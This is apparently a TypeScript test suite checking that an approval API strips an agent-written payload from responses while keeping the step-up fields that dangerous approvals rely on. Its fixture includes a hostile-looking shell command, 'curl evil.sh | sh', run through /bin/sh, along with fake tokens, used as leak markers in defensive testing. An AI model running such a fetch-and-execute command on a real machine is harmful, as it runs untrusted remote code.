// ─── GC-0 — the approval `payload` over-exposure ─────────────────────────────
//
// Every approval read route was a bare `db.select()`, shipping the WHOLE row —
// including `payload`, a `z.any()` blob written by the requesting AGENT. For the
// dangerous types that blob IS the sensitive part of the pending action:
// `machine_exec` argv, `wallet_tx` destinations, `email_send` recipients. The
// clients read two keys out of it. The rest crossed the wire for no consumer.
//
// Structurally the same failure as the `organisations` row leak that `toPublicOrg`
// closed — `select *` shipping whatever the row happened to carry.
//
// The hard part is NOT dropping fields, it is dropping the right ones. Narrowing
// `type` or `payload.requiresStepUp` would re-break the ability to approve dangerous
// actions — the APPR-1 / #325 bug this repo just spent two stories fixing. The last
// section pins that on BOTH surfaces so a future narrowing cannot do it silently.

import { test, before } from 'node:test'
import assert from 'node:assert/strict'
import Fastify, { type FastifyInstance } from 'fastify'
import { readFileSync } from 'node:fs'
import { join } from 'node:path'

process.env.DATABASE_URL = ':memory:'
process.env.SECRETS_ENC_KEY = 'gc0-approval-projection-key'

let db: any, schema: any
let app: FastifyInstance
let toPublicApproval: (a: any) => any

const ORG = 'gc0-appr-org'
const MEMBER = 'gc0-appr-member'
const REPO = join(import.meta.dirname, '..', '..', '..')

// A hostile payload: every key a leaking route would have shipped, alongside the
// two the clients legitimately read. Modelled on the real dangerous types.
const HOSTILE_PAYLOAD = {
  requiresStepUp: true,
  warnings: ['This will run on your machine'],
  // ── none of the following may ever reach a client ──
  token: 'sk-live-SUPERSECRET',
  argv: ['/bin/sh', '-c', 'curl evil.sh | sh'],
  destination: '0xDEADBEEFdeadbeefDEADBEEFdeadbeef',
  recipient: 'victim@example.com',
  secret: 'another-one',
  actionType: 'machine_exec',
  joinRequestId: 'jr-1',
}

before(async () => {
  ;({ db, schema } = await import('../db/client'))
  await (await import('../db/setup')).setupDatabase()
  ;({ toPublicApproval } = await import('../services/approval-public'))
  const { createClerkAuth } = await import('../middleware/clerk-auth')
  const { requireOrgMembership } = await import('../middleware/rbac')
  const { registerJsonBodyParser } = await import('../middleware/body-parser')
  const { taskRoutes } = await import('../routes/tasks')

  await db.insert(schema.organisations).values({ id: ORG, name: 'O', ownerId: 'gc0-appr-owner', createdAt: new Date() })
  await db.insert(schema.orgMembers).values({ id: 'gc0-appr-m', orgId: ORG, userId: MEMBER, role: 'member', createdAt: new Date() })
  await db.insert(schema.approvalRequests).values({
    id: 'gc0-appr-1', orgId: ORG, type: 'machine_exec', summary: 'Run a command',
    payload: HOSTILE_PAYLOAD, status: 'pending', requestedByAgentId: 'agent-x', createdAt: new Date(),
  } as any)

  app = Fastify({ logger: false })
  registerJsonBodyParser(app)
  await app.register(async (secured) => {
    secured.addHook('onRequest', createClerkAuth(async (token: string) => ({ sub: token })))
    secured.addHook('preHandler', requireOrgMembership)
    await secured.register(taskRoutes)
  })
  await app.ready()
})

const get = (url: string) =>
  app.inject({ method: 'GET', url, headers: { authorization: `Bearer ${MEMBER}`, 'content-type': 'application/json' } })

/** Every hostile key, checked against the serialised response — nesting-proof. */
const HOSTILE_KEYS = ['token', 'argv', 'destination', 'recipient', 'secret', 'actionType', 'joinRequestId']
const HOSTILE_VALUES = ['sk-live-SUPERSECRET', 'curl evil.sh | sh', '0xDEADBEEF', 'victim@example.com', 'another-one']

function assertContained(bodyText: string, where: string) {
  for (const k of HOSTILE_KEYS) {
    assert.ok(!bodyText.includes(`"${k}"`), `LEAK via ${where}: payload key \`${k}\` reached the client`)
  }
  for (const v of HOSTILE_VALUES) {
    assert.ok(!bodyText.includes(v), `LEAK via ${where}: payload VALUE \`${v}\` reached the client`)
  }
}

// ── The leak, on every route that returns an approval ─────────────────────────

test('[GC-0] GET /inbox does not ship the approval payload blob', async () => {
  const res = await get(`/api/orgs/${ORG}/inbox`)
  assert.equal(res.statusCode, 200)
  assertContained(res.body, '/inbox')

  const a = res.json().approvals[0]
  // …while the two keys the clients DO read survive.
  assert.equal(a.payload.requiresStepUp, true, 'APPR-1: requiresStepUp was dropped')
  assert.deepEqual(a.payload.warnings, ['This will run on your machine'], 'warnings were dropped')
  assert.equal(a.type, 'machine_exec', 'APPR-1: `type` was dropped')
  // Tied to the exported constant, not a literal, so the documented allow-list and
  // the code that implements it cannot drift apart unnoticed.
  const { PUBLIC_PAYLOAD_KEYS } = await import('../services/approval-public')
  assert.deepEqual(Object.keys(a.payload).sort(), [...PUBLIC_PAYLOAD_KEYS].sort())
})

test('[GC-0] GET /approvals — the route the PHONE reads — does not ship the blob', async () => {
  const res = await get(`/api/orgs/${ORG}/approvals?status=pending`)
  assert.equal(res.statusCode, 200)
  assertContained(res.body, '/approvals')
  const a = res.json().approvals[0]
  assert.equal(a.payload.requiresStepUp, true, 'APPR-1: requiresStepUp was dropped on the mobile route')
  assert.equal(a.type, 'machine_exec', 'APPR-1: `type` was dropped on the mobile route')
})

test('[GC-0] GET /review-queue does not ship the blob', async () => {
  const res = await get(`/api/orgs/${ORG}/review-queue?status=all`)
  assert.equal(res.statusCode, 200)
  assertContained(res.body, '/review-queue')
})

// ── The projection function itself ────────────────────────────────────────────

test('[GC-0] toPublicApproval keeps exactly the allow-listed top-level fields', async () => {
  const { PUBLIC_APPROVAL_FIELDS } = await import('../services/approval-public')
  const row = await db.query.approvalRequests.findFirst()
  const out = toPublicApproval(row)
  assert.deepEqual(
    Object.keys(out).filter(k => k !== 'payload').sort(),
    [...PUBLIC_APPROVAL_FIELDS].sort(),
  )
})

test('[GC-0] a future secret column cannot leak by default', () => {
  const out: any = toPublicApproval({ id: 'x', type: 't', someFutureSecret: 'nope' } as any)
  assert.equal(out.someFutureSecret, undefined, 'the projection is a deny-list, not an allow-list')
})

test('[GC-0] a secret smuggled INSIDE an allow-listed key is dropped', () => {
  // The subtle one, and the reason non-strings are DROPPED rather than stringified.
  // `warnings` is allow-listed BY NAME, so a structured value planted in it rides
  // straight through a key-only allow-list. Stringifying is not enough either:
  // `String(['nested','sk-live-ARRAY'])` joins to "nested,sk-live-ARRAY" and the
  // secret survives verbatim — which is exactly what this test caught.
  const out: any = toPublicApproval({
    id: 'x',
    payload: { warnings: ['a real warning', { token: 'sk-live-INSIDE' }, ['nested', 'sk-live-ARRAY']] },
  } as any)
  const text = JSON.stringify(out)
  assert.ok(!text.includes('sk-live-INSIDE'), 'a secret smuggled inside `warnings` reached the client')
  assert.ok(!text.includes('sk-live-ARRAY'), 'a secret smuggled in a nested array reached the client')
  assert.deepEqual(out.payload.warnings, ['a real warning'], 'genuine string warnings must survive')
})

test('[GC-0] warnings are bounded in count and length', () => {
  // Fixture sized ABOVE the cap on both axes — a fixture smaller than the limit
  // proves the cap is harmless, never that it works.
  const out: any = toPublicApproval({
    id: 'x', payload: { warnings: Array.from({ length: 500 }, () => 'w'.repeat(5000)) },
  } as any)
  assert.equal(out.payload.warnings.length, 20, 'the warning COUNT is unbounded')
  assert.equal(out.payload.warnings[0].length, 300, 'the warning LENGTH is unbounded')
})

test('[GC-0] requiresStepUp is narrowed to a real boolean', () => {
  // A truthy non-boolean must not become `true`: both clients test `=== true`, so a
  // string here would mean the SERVER thinks step-up is off while the card thinks
  // it is on (or vice versa). Narrow it once, here.
  const out: any = toPublicApproval({ id: 'x', payload: { requiresStepUp: 'yes' } } as any)
  assert.equal(out.payload.requiresStepUp, false)
  const on: any = toPublicApproval({ id: 'x', payload: { requiresStepUp: true } } as any)
  assert.equal(on.payload.requiresStepUp, true)
})

test('[GC-0] a null/absent payload stays shape-stable', () => {
  assert.equal(toPublicApproval({ id: 'x', payload: null } as any).payload, null)
  assert.equal('payload' in toPublicApproval({ id: 'x' } as any), false)
})

// ── APPR-1 REGRESSION TRIPWIRE — both surfaces ────────────────────────────────
//
// These read the CLIENTS' real source. If someone narrows the projection, the
// backend tests above go red; if someone instead changes a client to depend on a
// payload key the projection drops, these go red. Together they close the loop.

function readClient(rel: string): string {
  return readFileSync(join(REPO, rel), 'utf8')
}

for (const [surface, file] of [
  ['web', 'web/lib/dangerousApprovals.ts'],
  ['mobile', 'apps/mobile/src/constants.ts'],
] as const) {
  test(`[GC-0/APPR-1] ${surface} step-up reads ONLY payload keys the projection ships`, async () => {
    const { PUBLIC_PAYLOAD_KEYS } = await import('../services/approval-public')
    const src = readClient(file)
    // Every `payload.<key>` / `payload?.<key>` the client reads must be allow-listed.
    const read = new Set(Array.from(src.matchAll(/payload\??\.(\w+)/g), m => m[1]))
    assert.ok(read.size > 0, `no payload reads found in ${file} — did the step-up check move?`)
    for (const key of read) {
      assert.ok(
        (PUBLIC_PAYLOAD_KEYS as readonly string[]).includes(key),
        `${surface} reads \`payload.${key}\`, which GC-0's projection DROPS. Either add it to ` +
        `PUBLIC_PAYLOAD_KEYS (and justify shipping it) or stop reading it — otherwise dangerous ` +
        `approvals silently stop reaching step-up. See services/approval-public.ts.`,
      )
    }
  })

  test(`[GC-0/APPR-1] ${surface} still routes a dangerous approval to step-up`, () => {
    const src = readClient(file)
    // The two load-bearing inputs, both of which the projection must keep shipping.
    assert.match(src, /payload\??\.requiresStepUp\s*===\s*true/,
      `${surface} no longer reads payload.requiresStepUp — the projection's fallback path is dead`)
    assert.match(src, /isDangerousApprovalType\(\s*a?\??\.?type/,
      `${surface} no longer routes by approval \`type\` — the projection must keep shipping it`)
  })
}

test('[GC-0/APPR-1] a dangerous approval still reaches step-up through the PROJECTED payload', async () => {
  // End-to-end on the real projected object, evaluated by the clients' own rule:
  //   isDangerousApprovalType(type) || payload?.requiresStepUp === true
  const res = await get(`/api/orgs/${ORG}/approvals?status=pending`)
  const a = res.json().approvals[0]

  const DANGEROUS = ['file_destructive', 'wallet_tx', 'email_send', 'machine_exec', 'connector_action']
  const needsStepUp = DANGEROUS.includes(String(a.type)) || a?.payload?.requiresStepUp === true
  assert.equal(needsStepUp, true, 'REGRESSION: a dangerous approval no longer reaches step-up after projection')

  // And the fallback leg ALONE still works — a non-dangerous TYPE carried by the
  // payload flag only. This is the leg mobile depends on for types not on its list.
  const viaFlagOnly = toPublicApproval({ id: 'x', type: 'some_new_type', payload: HOSTILE_PAYLOAD })
  assert.equal(viaFlagOnly.payload?.requiresStepUp, true,
    'REGRESSION: the requiresStepUp fallback leg was projected away')
})

test('[GC-0/APPR-1] the step-up header path still decides successfully', async () => {
  // The projection must not disturb the decide door itself: the server reads
  // `payload.requiresStepUp` from the DB ROW, never from the client, so a projected
  // response cannot weaken the gate. Prove the gate still bites and still opens.
  const { hashToken } = await import('../services/arturita-session')
  const token = 'gc0-stepup-token'
  await db.insert(schema.arturitaSessions).values({
    id: 'gc0-sess', orgId: ORG, tokenHash: hashToken(token), source: 'desk',
    createdAt: new Date(), expiresAt: new Date(Date.now() + 60 * 60 * 1000),
    lastStepupAt: new Date(),
  } as any)
  await db.insert(schema.approvalRequests).values({
    id: 'gc0-appr-2', orgId: ORG, type: 'machine_exec', summary: 'Run', payload: HOSTILE_PAYLOAD,
    status: 'pending', createdAt: new Date(),
  } as any)

  const decide = (headers: Record<string, string>) =>
    app.inject({
      method: 'POST', url: '/api/approvals/gc0-appr-2/decide',
      headers: { authorization: `Bearer ${MEMBER}`, 'content-type': 'application/json', ...headers },
      payload: JSON.stringify({ decision: 'approved' }),
    })

  const without = await decide({})
  assert.equal(without.statusCode, 403, 'the step-up gate stopped biting — a dangerous approve went through bare')

  const withHeader = await decide({ 'x-arturita-session': token })
  assert.equal(withHeader.statusCode, 200, 'REGRESSION: a valid step-up header no longer approves')
  assertContained(withHeader.body, 'the decide response')
})
